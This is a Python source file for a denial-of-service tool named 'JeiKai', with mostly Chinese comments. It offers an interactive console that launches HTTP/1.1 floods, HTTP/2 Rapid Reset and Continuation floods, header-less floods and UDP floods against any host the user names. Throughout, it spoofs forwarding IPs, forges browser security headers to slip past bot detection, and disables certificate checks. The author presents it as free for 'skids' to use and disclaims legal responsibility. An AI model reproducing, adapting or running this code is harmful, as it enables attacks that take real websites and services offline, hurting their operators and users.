import socket
import os
import sys
import ssl
import time
import random
import threading
from colorama import Fore
from h2.config import H2Configuration
from h2.connection import H2Connection

brute = False # 最少數量header 不關閉socket連線
th_re = False # 無限的開啟線程 (不會導致core dump 放心使用)
th_list = []
ua_list = open('useragent.txt').readlines()
string = ['Hurricane','Proknight','Sockskull','Taixies','Collapser','Deprave','JeiKai','Noro','Ebola']

"""
    JeiKai DoS Script Free Source
    For All Skid ~

    Use this on vps or vm ,
    Try the best performance of DoS,
    But I do not bear any legal responsibility for that haha.

    基本上這個腳本不會有core dump的情況
    傳統的dos腳本會透過 for迴圈 去啟用threads 並設定一個range
    這種方式不是不行 而是當有某個socket被關閉後 該迴圈執行的flood就會失效
    導致你會看到圖表的數字越來越低 直至一個穩定的低值
    這是不好的 既然要壓測 就要保持每秒請求在最高值

    比起每個線程去偵測socket連線並在線程內重啟socket
    不如限制最高線程數量 只要有個線程因socket斷開 被關閉
    即補上開啟新的線程 搭配reuseaddr 最大保持請求數量 簡單粗暴

    所以我的腳本可以達理論上的最高性能 
    歡迎有能力的自行修改程式碼 (優化本來就是無止盡的對吧 !)
    """


def joinThreads(): #後台加入thread.join 確保美個線程工作都能完成 不論是持續峰送請求或者關閉socket
    time.sleep(1)
    while 1:
        if len(th_list) > 0:
            for th in th_list:
                try:
                    th.join()
                except AttributeError:
                    pass
        time.sleep(5)

    
def launchThreads(tp):  #在指定時間內 無上限開啟threads 
    global th_going     #反正有設定semaphore 不怕core dump
                        #全網獨家 首個引入這機制的腳本
    if tp == 'http' or tp == 'pps' or tp == 'bypass' or tp == 'rst' or tp == 'udp':
        pass
    else:
        return
    print("OK")
    threading.Thread(target=joinThreads).start()
    while True:
        if round(time.time()) < specs: # 不直接放while迴圈判斷 因為效能會下降
            try:
                if tp == "http" or tp == "bypass":
                    t = threading.Thread(target=run_http_flood, daemon=True)
                elif tp == "pps":
                    t = threading.Thread(target=run_pps_flood, daemon=True)
                elif tp == "rst":
                    t = threading.Thread(target=run_rst_stream, daemon=True)
                elif tp =='udp':
                    t = threading.Thread(target=run_udp_flood, daemon=True)
                else:
                    continue
                t.start()
                th_list.append(t)
            except:
                time.sleep(1)
        else:
            th_going = False
            break
    th_going = False
    return 0


def forThreads(tp):  #傳統腳本使用的 以for迴圈啟動threads並呼叫攻擊
    global th_going  #這個方式相對穩定 80M的頻寬每秒大概能有4k~8k的請求 (full header)
    ths = []         #但沒法達到理論性能上限 要達上限還是推薦我上面的無上限threads + semaphore
    if tp == 'http' or tp == 'pps' or tp == 'bypass' or tp == 'rst' or tp == 'udp':
        pass
    else:
        return
    
    for _ in range(th_num):
        try:
            if tp == "http" or tp == "bypass":
                t = threading.Thread(target=run_http_flood, daemon=True)
            elif tp == "pps":
                t = threading.Thread(target=run_pps_flood, daemon=True)
            elif tp == "rst":
                t = threading.Thread(target=run_rst_stream, daemon=True)
            elif tp =='udp':
                t = threading.Thread(target=run_udp_flood, daemon=True)
            else:
                continue
            t.start()
        except:
            pass
    while round(time.time()) > specs:
        th_going = False


def showMethods(): #攻擊模式選擇
    clearScreen()
    print(f"\n{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}")
    print(f"     ============================================= ")
    print(f"    |            Layer7 Attack Methods            |")
    print(f"     --------------------------------------------- ")
    print(f"    |{Fore.GREEN}.http   {Fore.RESET}| {Fore.YELLOW}Layer7 Http plain Flood            {Fore.RESET}|")
    print(f"    |{Fore.GREEN}.rst    {Fore.RESET}| {Fore.YELLOW}Http2 Rapid Reset Flood            {Fore.RESET}|")
    print(f"    |{Fore.GREEN}.pps    {Fore.RESET}| {Fore.YELLOW}Flood Target with no Headers       {Fore.RESET}|")
    print(f"    |{Fore.GREEN}.bypass {Fore.RESET}| {Fore.YELLOW}Flood With Sec headers             {Fore.RESET}|")
    print(f"     --------------------------------------------- ")
    print(f"    |            Layer4 Attack Methods            |")
    print(f"     --------------------------------------------- ")
    print(f"    |{Fore.GREEN}.udp    {Fore.RESET}| {Fore.YELLOW}Basic UDP Plain Flood              {Fore.RESET}|")
    print(f"     ============================================= ")
    print(f"    |{Fore.GREEN} --brute {Fore.RESET}| {Fore.YELLOW}Keep socket always connected      {Fore.RESET}|")
    print(f"    |{Fore.GREEN} --re    {Fore.RESET}| {Fore.YELLOW}Keep launch new threads           {Fore.RESET}|")
    print(f"     ============================================= ")
    print(f"{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}\n")


def showInfo(): #簡介
    clearScreen()
    print(f"\n{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}")
    print("JeiKai DDoS will always be a free and open source script.")
    print("It has been nearly 10 years since I started to be interested in DDoS.")
    print("And I also developed many high-performance DDoS scripts")
    print("So enjoy this script and use it.")
    print(f"{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}\n")


def showHelp(): #幫助訊息
    clearScreen()
    print(f"\n{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}")
    print("help    | Show this help message")
    print("methods | Show attack methods")
    print("clear   | Clear screen")
    print("info    | Show script info")
    print(f"{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}\n")


def GetReferer():
    referers = [ #一些常見的搜尋引擎referer, 現在很少有機制針對referer了 可有可無
        f'https://www.google.com/search?q={host}',
        f'https://www.bing.com/search?q={host}',
        f'https://tw.search.yahoo.com/search?p={host}',
        f'https://duckduckgo.com/?t=h_&q={host}'
    ]

    return random.choice(referers)


def fakeIP(): #假IP 專幹那些低能後端工程師
    ip = ""
    for _ in range(4):
        ip += f".{random.randint(0,254)}"
        # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
        # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
        # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
        # 任何傳到後端的資料都是可以經過偽造的 切記 !
        # 只有TCP連線那個IP 才是真的流量來源 (如果是cc就會是代理的IP, botnet就會是bot的ip)
    return ip[1:] # 123.123.123.123


def clearScreen(): #清除螢幕畫面
    if os.name =='nt':
        os.system('cls')
    else:
        os.system('clear')
    banner()


def headerHandle(): #封包標頭處理

    # Http 一般標頭 包含常見的connection跟accept等 
    # 如果網站不在任何雲端節點上 那這些標頭就可以實現癱瘓
    conn = f"Connection: Keep-Alive:823\r\n"
    accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
    referer = f"Referer: {GetReferer()}\r\n"
    useragent = f"User-Agent: {random.choice(ua_list).strip()}\r\n"
    x_for = f"X-Forwarded-For: {fakeIP()}\r\nClient-IP: {fakeIP()}\r\nVia: 1.1 {fakeIP()}\r\n"
    cache = f"Cache-Control: no-cache, max-age=0\r\n"
    pri = f"Priority: u=1, i\r\n"
    origin = f"Origin: "
    if port == 443:
        origin += f"https://{host}\r\n"
    else:
        origin += f"http://{host}\r\n"
    uir = f"Upgrade-Insecure-Requests: 1\r\n"

    # Http 安全性標頭, 大部分主流的瀏覽器都支援了, 是判斷為正常流量 或是機器人的標準之一
    # 新的站點大部分都是預設啟用sec的, 也就是沒有sec的都會被識別為惡意流量
    sec = f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"\r\n"
    sec += f"Sec-Ch-Ua-arch: \"x86\"\r\n"
    sec += f"Sec-Ch-Ua-bitness: \"64\"\r\n"
    sec += f"Sec-Ch-Ua-full-version-list: \"Chromium\";v=\"136.0.0.0\", \"Brave\";v=\"136.0.0.0\", \"Not.A/Brand\";v=\"99.0.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-mobile: ?0\r\n"
    sec += f"Sec-Ch-Ua-model: \"\"\r\n"
    sec += f"Sec-Ch-Ua-platform: \"Windows\"\r\n"
    sec += f"Sec-Ch-Ua-platform-version: \"19.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-wow64: ?0\r\n"
    sec += f"Sec-Fetch-Dest: document\r\n"
    sec += f"Sec-Fetch-Mode: navigate\r\n"
    sec += f"Sec-Fetch-Site: same-origin\r\n"
    sec += f"Sec-Fetch-User: ?1\r\n"
    sec += f"Sec-Gpc: 1\r\n"

    header = conn + accept + referer + useragent + x_for + cache + pri + origin + uir
    if brute: #如果啟用brute 就最大程度減少標頭 只留關鍵標頭
        header = conn + cache + referer + useragent + uir
    if tp == 'bypass': #如果是bypass模式 那就必須加入sec
        header +=sec
    return header #回傳處理好的標頭


def run_udp_flood():
    payload = random._urandom(p_size)
    with th_limit:
        while th_going:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(rpc):
                    s.sendto(payload, (host, port))
            except:
                pass
        return 0
    return 0


def run_http_flood(): #HTTP1/1的洪流
    with th_limit: # 騷操作 從semaphore去限制總執行序的數量 這樣你可以無限開啟執行序
        while th_going:
            header = headerHandle() # 呼叫一下標頭涵式處理
            header += '\r\n' #最後一定要加上\r\n才算是一個完整請求 輪子自己造 切記!
            try:
                #設置socket為 IPv4, TCP協議
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                #啟動重複綁定ip address
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                #設定傳送緩衝區 (16MB
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096)

                s.connect_ex((host, port)) #connect_ex 只會回傳結果0, 1 因為dos不用管回傳啥 越小越省事
                if port == 443: #如果是443端口 即啟用ssl 
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # 一定要指定TLS_CLIENT, 一些只支援新版TLS的網站沒指定TLS_CLIENT會拒絕連線
                    context.check_hostname = False #不檢查域
                    context.verify_mode = ssl.CERT_NONE #允許空白證書
                    s = context.wrap_socket(s, server_hostname=host) #使用ssl連線並發送封包
                try:
                    for _ in range(rpc): #自訂每個tcp連線要發多少封包 建議不超過100 現在防火牆都很機賊 量多就封 所以不如有用一點 量少 發完就關閉連線 

                        # 傳送封包 這裡傳出去的請求大概會是這樣 -> GET /?test=1 HTTP/1.1\r\nHost: google.com\r\n{header}\r\n\r\n
                        # 為的就是不讓請求被快取掉 用隨機路徑可以略過快取 並加大伺服器的處理負擔
                        # 把CPU占滿 也是一種方式 !
                        s.send(f"{method} {path}?{random.choice(string)}={random.randint(1,65535)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
                    if not brute: #所以除非啟用brute 不然預設都是發完包就關閉此socket
                        s.close()
                except:
                    s.close()
            except:
                s.close()
        return 0
    return 0


def run_pps_flood(): # 測試用, 實用性很低 但是打圖表可以有很高的成績 (基本上很多botnet的http flood都是這樣 不塞header)
    # 這邊都跟上面相似 只是semaphore設定為800
    # 這算我試過最大效能的數字 不信自己改改就知道了
    with th_limit: 
        while th_going:
            # 因為要測試pps的圖表都是接受任何封包的 所以沒其他標頭也可以
            # 留個connection告訴伺服器不要關閉socket就好
            header = "Connection: Keep-Alive\r\n\r\n" 
            try:
                #一樣
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                #一樣
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                #傳送小封包時 忽略Nagle, 這在某些系統上可以增加傳送效率
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

                #一樣
                s.connect_ex((host, port))
                if port == 443:
                    tls = ssl.create_default_context() # 原理一樣 PPS不需要太多設定 都用預設就好
                    s = tls.wrap_socket(s, server_hostname=host)
                try:
                    for _ in range(rpc):
                        s.send(f"{method} {path}?{random.choice(string)}={random.randint(1,65535)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
                    if not brute:
                        s.close()
                except:
                    s.close()
            except:
                s.close()
        return 0
    return 0


def run_rst_stream(): # HTTP/2 Rapid Reset mix Continuation-Flood (不一定有效 畢竟這兩個漏洞很久了)
    with th_limit:
        while th_going:
            try:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096)
                if s.connect_ex((host, port)) != 0:
                    s.close()
                    continue

                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # 一定要指定TLS_CLIENT
                context.check_hostname = False 
                context.verify_mode = ssl.CERT_NONE
                context.set_alpn_protocols(["h2"]) # 建立 TLS socket 並協商 ALPN 為 HTTP/2
                s = context.wrap_socket(s, server_hostname=host)
                if s.selected_alpn_protocol() != "h2":
                    s.close()
                    continue

                # 傳送 HTTP/2 preface (這個測試過 如果傳送了 那後面的封包都會無效)
                # s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')

                try:
                    # 初始化 HTTP/2 連線
                    config = H2Configuration(client_side=True)
                    conn = H2Connection(config=config)
                    conn.initiate_connection()

                    # data = s.recv(65535)
                    # conn.receive_data(data) # 很多人說需要回傳 但是我自己測試 是不用的
                    s.sendall(conn.data_to_send()) # 開啟http2連線
                    
                    try:
                        sid_lst = [] # 儲存sid用
                        for _ in range(rpc):
                            sid = 1 + 2 * _ # sid必須是奇數 1,3,5,7,9
                            sid_lst.append(sid) # 加進sid_lst

                            conn.send_headers(sid, [ # 設定header
                                (":method", method),
                                (":authority", host),
                                (":scheme", "https"),
                                (":path", f"{path}?{random.choice(string)}={random.randint(1,65535)}"),
                                ("user-agent", random.choice(ua_list).strip()),
                                ("cache-control", "no-cache, max-age=0"),
                                ("jeikai", "fm/6ru6u4g/ u.4ck6rm4" * 100) #這個值越大 越能實現Continuation-Flood的效果 我這邊是做混合  我不確定http/2的header可以塞多少字元 通常在2000字元最穩 
                            ], end_stream=False) # end_stream設定為True會直接關閉此次串流 所以用False

                            # conn.send_data(sid, b"x" * 1024, end_stream=False)  # 模擬 body (沒啥用 註解掉了

                            s.sendall(conn.data_to_send()) # 改用sendall送完所有資料

                        # try:
                        #     data = s.recv(65535) # 同步frame (一樣沒啥用
                        #     conn.receive_data(data)
                        # except:
                        #     pass

                        for sid in sid_lst: # 這裡從sid_lst一次性把所有sid 做reset
                            conn.reset_stream(sid)
                            s.sendall(conn.data_to_send()) # 改用sendall送完所有資料
                        # print("suc rst")
                    except:
                        s.close()
                        # print("stream failed")
                except:
                    s.close()
                    # print("init failed")
            except Exception as e:
                s.close()
                # print(f"socket error {e}")
        return 0
    return 0


def banner(): # 開始畫面
    print(f"""
{Fore.BLUE}  o         o  o   o         o     ooo.   ooo.          .oPYo. 
{Fore.BLUE}  8            8  .P               8  `8. 8  `8.        8      
{Fore.BLUE}  8 .oPYo. o8 o8ob'  .oPYo. o8     8   `8 8   `8 .oPYo. `Yooo. 
{Fore.CYAN}  8 8oooo8  8  8  `b .oooo8  8     8    8 8    8 8    8     `8 
{Fore.CYAN}  8 8.      8  8   8 8    8  8     8   .P 8   .P 8    8      8 
{Fore.CYAN}oP' `Yooo'  8  8   8 `YooP8  8     8ooo'  8ooo'  `YooP' `YooP' 
{Fore.CYAN}...::.....::..:..::..:.....::..::::.....::.....:::.....::.....:
{Fore.BLUE}::::::::::{Fore.WHITE}Best DoS Script Ever, Code By JeiKai{Fore.BLUE}:::::::::::::::::
{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
""")


if __name__ =='__main__':
    clearScreen()
    while True:
        try:
            cmd = str(input(f'{Fore.CYAN}╔═══[{Fore.YELLOW}JeiKai{Fore.RED}@{Fore.YELLOW}DDoS{Fore.CYAN}]-[{Fore.YELLOW}PRO{Fore.CYAN}]\n╚══> {Fore.WHITE}'))
            if cmd != "":

                if "--brute" in cmd: # 啟用brute
                    brute = True
                if "--re" in cmd: # 啟用無限線程
                    th_re = True

                # 一般命令處理
                if "?" in cmd or "help" in cmd:
                    showHelp() # 幫助訊息
                if "method" in cmd:
                    showMethods() # 攻擊訊息
                if "clear" in cmd or "cls" in cmd: 
                    clearScreen() # 清除螢幕
                if "info" in cmd:
                    showInfo() # 關於腳本
                if "stop" in cmd or "STOP" in cmd: #停止攻擊
                    th_going = False
                if "exit" in cmd or "EXIT" in cmd or "logout" in cmd: # 離開腳本
                    sys.exit()

                # 攻擊命令處理
                if ".http" in cmd or ".pps" in cmd or ".rst" in cmd or ".bypass" in cmd or '.udp' in cmd:
                    sct = False
                    argv = cmd.split(" ")
                    tp = argv[0][1:] # 攻擊模式

                    if tp == "udp":
                        if len(argv) == 7:

                            # 參數設定
                            host = argv[1]
                            port = int(argv[2])
                            p_size = int(argv[3])
                            th_num = int(argv[4])
                            rpc = int(argv[5])
                            timeout = int(argv[6])
                            specs = round(time.time()) + timeout # 指定攻擊時間 (但好像沒效 我不知道為啥)
                            th_going = True # 控制攻擊停止
                            sct = True

                        else:
                            print(f"Use: {argv[0]} <IP> <PORT> <SIZE> <THREAD> <PPC> <TIME>")
                            pass

                    elif tp == 'rst' or tp == 'http' or tp == "pps" or tp == "bypass":
                        if len(argv) >= 8:

                            # 參數設定
                            method = argv[1].upper() # 請求方式
                            host = argv[2] # 主機(網站)位置
                            port = int(argv[3]) # 端口
                            path = argv[4] # 路徑
                            th_num = int(argv[5]) # 線程數
                            rpc = int(argv[6]) # 每個TCP連線的請求數, 對於一些有限制連接的網站來說 這個設置20~50最佳
                            timeout = int(argv[7]) # 持續時間
                            specs = round(time.time()) + timeout # 指定攻擊時間 (但好像沒效 我不知道為啥)
                            th_going = True # 控制攻擊停止
                            sct = True

                        else:
                            print(f"Use: {argv[0]} <method> <host> <port> <path> <threads> <rpc> <time>")
                            #命令錯誤提示
                            pass
                    else:
                        pass

                    if sct:
                        th_limit = threading.Semaphore(th_num)
                        if th_re: # 無限線程
                            md = f"High Performance"
                            threading.Thread(target=launchThreads, args=(tp,)).start() #啟動無上限threads
                        else: # for迴圈線程
                            md = f"Limit Threads"
                            threading.Thread(target=forThreads, args=(tp,)).start() #啟動傳統for迴圈

                        print(f"\nAttack Sent , Runnung through {Fore.YELLOW}{th_num}{Fore.RESET} threads & {Fore.YELLOW}{rpc}{Fore.RESET} requests for connection")
                        print(f"Target: {Fore.YELLOW}{host}{Fore.RESET}, Port: {Fore.YELLOW}{port}{Fore.RESET}, Mode: {Fore.GREEN}{md}{Fore.RESET}")
                    else:
                        pass
                else:
                    pass
            else:
                pass
        except KeyboardInterrupt:
            sys.exit()
        finally:
            pass
